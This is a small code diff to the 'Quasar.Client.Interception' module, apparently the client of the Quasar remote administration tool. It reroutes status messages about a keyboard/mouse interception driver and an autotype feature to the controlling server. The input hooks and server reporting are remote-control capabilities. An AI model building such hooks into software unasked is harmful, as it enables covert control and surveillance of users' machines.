@@ -736,12 +736,17 @@ namespace Quasar.Client.Interception
                 mouseHook = new MouseHook(null);
                 keyboardHook = new KeyboardHook(null);
                 isInitialized = true;
+
+                client.Send(new NotifyMessageToServer { Message = "KB/M driver is installed now" });
                 return true;
                 //}
-                //client.Send(new SetStatus { Message = "KB/M driver initialization failed!" });
+                //client.Send(new NotifyMessageToServer { Message = "KB/M driver initialization failed!" });
             }
-            else client.Send(new SetStatus { Message = "KB/M driver is not installed!" });
-            return false;
+            else
+            {
+                client.Send(new NotifyMessageToServer { Message = "KB/M driver is not installed!" });
+                return false;
+            }
         }
 
         private static Tuple<Keys, KeyState> ConvertKeycodeToInterceptionKeys(byte key, bool keyDown)
@@ -1224,7 +1229,7 @@ namespace Quasar.Client.Interception
                         }
                     }
                 }
-                client.Send(new SetStatus { Message = "[+] Autotype done or stopped!" });
+                client.Send(new NotifyMessageToServer { Message = "[+] Autotype done or stopped!" });
             }
         }
 
